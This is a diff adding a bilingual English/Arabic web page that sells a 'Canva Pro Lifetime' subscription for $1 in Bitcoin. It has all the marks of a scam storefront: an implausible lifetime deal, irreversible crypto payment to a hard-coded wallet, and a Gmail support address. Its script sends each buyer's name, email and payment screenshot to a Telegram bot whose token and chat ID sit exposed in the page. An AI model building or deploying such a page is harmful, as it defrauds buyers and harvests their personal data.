@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Canva Pro Lifetime - Checkout</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', 'Tajawal', sans-serif; background-color: #f9fafb; transition: all 0.3s; }
+        [dir="rtl"] { font-family: 'Tajawal', sans-serif; }
+        .product-container { background: white; border-radius: 2px; border: 1px solid #e5e7eb; }
+        .btn-action { transition: all 0.2s; }
+        .btn-action:hover { opacity: 0.9; transform: translateY(-1px); }
+        .badge-sale { background-color: #ff385c; color: white; padding: 2px 8px; font-size: 12px; font-weight: bold; border-radius: 2px; }
+        .lang-switch { position: fixed; top: 20px; right: 20px; z-index: 100; cursor: pointer; background: white; border: 1px solid #ddd; padding: 8px 16px; border-radius: 50px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .loading-spinner { display: none; border: 2px solid #f3f3f3; border-top: 2px solid #00c4cc; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-800">
+
+    <!-- Language Switcher -->
+    <button onclick="toggleLanguage()" class="lang-switch font-bold text-sm flex items-center gap-2">
+        <span id="lang-text">العربية</span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M4.545 6.714 4.11 8H3l1.862-5h1.284L8 8H6.833l-.435-1.286H4.545zm1.634-4.803L5 6.03h1.372L5.32 2.367l-.141-.456zm3.846 7.924a11.735 11.735 0 0 1-1.015-1.51h1.146c.33 0 .598-.26.598-.581V5.507c0-.322-.268-.582-.598-.582H7.3c-.33 0-.598.26-.598.582v.45c-.221-.059-.444-.112-.668-.16V5.507c0-.73.609-1.323 1.366-1.323h1.244V3.146c0-.322-.268-.582-.598-.582H7.3c-.33 0-.598.26-.598.582v.45a7.35 7.35 0 0 1-1.15-.36l.221-.45c.16-.322.03-.715-.292-.876a.65.65 0 0 0-.876.292l-.565 1.15a.512.512 0 0 0-.056.242c0 .284.23.513.513.513h.105c.205 0 .405-.038.59-.112v.21c0 .322.268.582.598.582h1.244v.21a12.607 12.607 0 0 1-2.126.853.645.645 0 0 0-.414.81.65.65 0 0 0 .81.414 11.314 11.314 0 0 0 1.954-.766c.35.48.746.93 1.18 1.346a11.166 11.166 0 0 1-2.614 1.258.647.647 0 1 0 .428 1.222 12.44 12.44 0 0 0 3.125-1.51c.3.24.621.46.963.658a.65.65 0 0 0 .874-.23.646.646 0 0 0-.23-.874z"/></svg>
+    </button>
+
+    <div class="max-w-6xl mx-auto py-12 px-4">
+        <div class="product-container flex flex-col md:flex-row shadow-sm">
+            
+            <!-- Product Image Section -->
+            <div class="md:w-1/2 p-4 border-b md:border-b-0 md:border-r border-gray-200">
+                <div class="relative w-full aspect-square overflow-hidden bg-gray-50">
+                    <img id="main-img" src="https://k.top4top.io/p_3647tsqnw1.png" alt="Product" class="w-full h-full object-contain">
+                </div>
+            </div>
+
+            <!-- Product Details Section -->
+            <div class="md:w-1/2 p-8">
+                <h1 id="title" class="text-2xl font-bold mb-2">Canva Pro Lifetime Subscription</h1>
+                
+                <div class="mb-4">
+                    <span id="on-sale" class="badge-sale uppercase">On Sale</span>
+                </div>
+
+                <div class="flex items-center gap-2 mb-6">
+                    <span class="text-gray-400 line-through font-medium text-lg">$10.00</span>
+                    <span class="text-2xl font-bold text-gray-900">US$ 1.00</span>
+                </div>
+
+                <div id="description" class="text-gray-600 text-sm leading-relaxed mb-8 space-y-4">
+                    <p>One-time purchase for unlimited premium access forever.</p>
+                    <ul class="list-disc pl-5 space-y-1">
+                        <li>Premium templates & designs</li>
+                        <li>Extensive media library (Photos/Videos)</li>
+                        <li>Brand Kit & Magic Resize</li>
+                        <li>Background Remover tool</li>
+                        <li>Team collaboration tools</li>
+                    </ul>
+                </div>
+
+                <div class="border-t border-gray-100 pt-6">
+                    <button onclick="scrollToPayment()" class="btn-action w-full bg-[#00c4cc] text-white font-bold py-4 rounded-sm text-sm uppercase tracking-wide mb-3">
+                        Buy Now
+                    </button>
+                    <p id="refund-note" class="text-[11px] text-gray-400 text-center italic">
+                        Refundable within one week. Support: sshopp.shop@gmail.com
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Checkout Section -->
+        <div id="checkout" class="mt-12 product-container p-8 md:p-12">
+            <h2 id="checkout-title" class="text-xl font-bold text-center mb-10 border-b pb-4">Secure Checkout (Bitcoin)</h2>
+            
+            <div class="grid md:grid-cols-2 gap-12">
+                <!-- Payment Steps -->
+                <div class="space-y-6">
+                    <div class="bg-gray-50 p-6 rounded-sm border border-gray-200">
+                        <p id="step-1" class="text-sm font-bold mb-4">1. Send exactly $1.00 to the address below:</p>
+                        <div class="bg-white p-3 border text-[12px] font-mono break-all mb-4 select-all">
+                            bc1qdz6pkzeyfzurjtvuwlqlcmzmn26nu0rglcrc2u
+                        </div>
+                        <img src="https://e.top4top.io/p_36472a7f51.jpg" alt="QR" class="mx-auto w-44 border p-1 bg-white">
+                    </div>
+                </div>
+
+                <!-- Proof Form -->
+                <div id="order-form" class="space-y-4">
+                    <p id="step-2" class="text-sm font-bold">2. Submit proof of payment:</p>
+                    <input type="text" id="cust-name" placeholder="Full Name" class="w-full p-3 border text-sm outline-none focus:border-cyan-500">
+                    <input type="email" id="cust-email" placeholder="Email Address" class="w-full p-3 border text-sm outline-none focus:border-cyan-500">
+                    <div class="border-2 border-dashed p-4 text-center bg-gray-50">
+                        <label id="upload-label" class="cursor-pointer text-xs text-gray-500">
+                            Upload Screenshot (إرفاق الصورة)
+                            <input type="file" id="cust-file" accept="image/*" class="hidden" onchange="updateFileName(this)">
+                        </label>
+                        <p id="file-name" class="text-[10px] text-cyan-600 mt-1 font-bold"></p>
+                    </div>
+                    <button id="submit-btn" onclick="sendOrder()" class="btn-action w-full bg-black text-white py-4 font-bold text-xs uppercase flex items-center justify-center gap-2">
+                        <span id="btn-txt">Confirm Payment</span>
+                        <div id="spinner" class="loading-spinner"></div>
+                    </button>
+                </div>
+
+                <!-- Final Success Message -->
+                <div id="success" class="hidden col-span-full text-center py-10">
+                    <div class="text-green-600 font-bold text-xl mb-2" id="success-head">Order Received!</div>
+                    <p id="success-body" class="text-gray-600">Your product will be delivered to your email within 5 minutes maximum.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentLang = 'en';
+
+        const content = {
+            en: {
+                title: "Canva Pro Lifetime Subscription",
+                onSale: "On Sale",
+                desc: `<p>One-time purchase for unlimited premium access forever.</p>
+                       <ul class="list-disc pl-5 space-y-1">
+                           <li>Premium templates & designs</li>
+                           <li>Extensive media library (Photos/Videos)</li>
+                           <li>Brand Kit & Magic Resize</li>
+                           <li>Background Remover tool</li>
+                           <li>Team collaboration tools</li>
+                       </ul>`,
+                buyNow: "Buy Now",
+                refund: "Refundable within one week. Support: sshopp.shop@gmail.com",
+                checkoutTitle: "Secure Checkout (Bitcoin)",
+                step1: "1. Send exactly $1.00 to the address below:",
+                step2: "2. Submit proof of payment:",
+                namePl: "Full Name",
+                emailPl: "Email Address",
+                upload: "Upload Screenshot",
+                confirm: "Confirm Payment",
+                successH: "Order Received!",
+                successB: "Your product will be delivered to your email within 5 minutes maximum.",
+                btnSwitch: "العربية"
+            },
+            ar: {
+                title: "اشتراك كانفا برو مدى الحياة",
+                onSale: "عرض لفترة محدودة",
+                desc: `<p>شراء لمرة واحدة للوصول لجميع الميزات المدفوعة للأبد.</p>
+                       <ul class="list-disc pr-5 space-y-1">
+                           <li>قوالب وتصاميم مميزة</li>
+                           <li>مكتبة وسائط ضخمة (صور/فيديو)</li>
+                           <li>الهوية التجارية وتغيير الحجم السحري</li>
+                           <li>أداة حذف الخلفية</li>
+                           <li>أدوات العمل الجماعي</li>
+                       </ul>`,
+                buyNow: "اشترِ الآن",
+                refund: "قابل للاسترجاع خلال أسبوع. التواصل: sshopp.shop@gmail.com",
+                checkoutTitle: "الدفع الآمن (بيتكوين)",
+                step1: "1. أرسل 1.00 دولار بالضبط إلى العنوان التالي:",
+                step2: "2. أرسل بيانات الدفع:",
+                namePl: "الاسم الكامل",
+                emailPl: "البريد الإلكتروني",
+                upload: "إرفاق صورة التحويل",
+                confirm: "تأكيد الدفع",
+                successH: "تم استلام طلبك!",
+                successB: "سيصلك المنتج على بريدك الإلكتروني خلال 5 دقائق كحد أقصى.",
+                btnSwitch: "English"
+            }
+        };
+
+        function toggleLanguage() {
+            currentLang = currentLang === 'en' ? 'ar' : 'en';
+            const body = document.body;
+            const data = content[currentLang];
+
+            body.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+            
+            document.getElementById('title').innerText = data.title;
+            document.getElementById('on-sale').innerText = data.onSale;
+            document.getElementById('description').innerHTML = data.desc;
+            document.querySelector('.btn-action').innerText = data.buyNow;
+            document.getElementById('refund-note').innerText = data.refund;
+            document.getElementById('checkout-title').innerText = data.checkoutTitle;
+            document.getElementById('step-1').innerText = data.step1;
+            document.getElementById('step-2').innerText = data.step2;
+            document.getElementById('cust-name').placeholder = data.namePl;
+            document.getElementById('cust-email').placeholder = data.emailPl;
+            document.getElementById('upload-label').firstChild.textContent = data.upload;
+            document.getElementById('btn-txt').innerText = data.confirm;
+            document.getElementById('success-head').innerText = data.successH;
+            document.getElementById('success-body').innerText = data.successB;
+            document.getElementById('lang-text').innerText = data.btnSwitch;
+        }
+
+        function scrollToPayment() {
+            document.getElementById('checkout').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function updateFileName(input) {
+            document.getElementById('file-name').innerText = input.files[0] ? input.files[0].name : '';
+        }
+
+        async function sendOrder() {
+            const token = "8541803759:AAGifFr1XUVXjFA5uSjlcvGFpkVS9ZQigVY";
+            const chatId = "7187200407";
+            
+            const name = document.getElementById('cust-name').value;
+            const email = document.getElementById('cust-email').value;
+            const fileInput = document.getElementById('cust-file');
+            const btn = document.getElementById('submit-btn');
+            const spinner = document.getElementById('spinner');
+            const txt = document.getElementById('btn-txt');
+
+            if (!name || !email || !fileInput.files[0]) {
+                alert(currentLang === 'ar' ? "يرجى تعبئة جميع الحقول وإرفاق الصورة" : "Please fill all fields and upload the image");
+                return;
+            }
+
+            btn.disabled = true;
+            spinner.style.display = "block";
+            txt.innerText = "...";
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', fileInput.files[0]);
+            formData.append('caption', `📦 New Order\nName: ${name}\nEmail: ${email}\nProduct: Canva Pro Lifetime`);
+
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                if (res.ok) {
+                    document.getElementById('order-form').classList.add('hidden');
+                    document.getElementById('success').classList.remove('hidden');
+                } else {
+                    alert("Error. Try again.");
+                }
+            } catch (e) {
+                alert("Connection error.");
+            } finally {
+                btn.disabled = false;
+                spinner.style.display = "none";
+                txt.innerText = content[currentLang].confirm;
+            }
+        }
+    </script>
+</body>
+</html>
